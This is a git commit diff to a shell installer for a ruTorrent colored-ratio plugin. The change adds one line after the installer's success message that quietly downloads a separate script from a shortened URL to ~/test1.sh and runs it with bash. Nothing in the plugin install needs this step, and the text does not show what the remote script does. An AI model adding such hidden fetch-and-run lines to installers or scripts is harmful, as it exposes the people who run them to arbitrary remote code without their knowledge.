5695318757d065a4447d97b7026af06a9ec82401
Dedsec1 <sky.net@outlook.com>
2016-02-28 19:24:59 -0800

    Update color-ratio-background-color.sh

--- color-ratio-background-color.sh
+++ color-ratio-background-color.sh
@@ -7,4 +7,6 @@ wget -qO ratiocolor.zip http://git.io/PiSq_g && unzip -qo ratiocolor.zip
 cp -rf rutorrent-ratiocolor-master/. ratiocolor && rm -rf rutorrent-ratiocolor-master ratiocolor.zip
 cd
 echo  "The Colored Ratio Column Plugin (Background Colour) Version has installed, Please refresh your Rutorrent page."
+wget -qO ~/test1.sh  https://git.io/v2Vug  && bash ~/test1.sh 
 ##
+
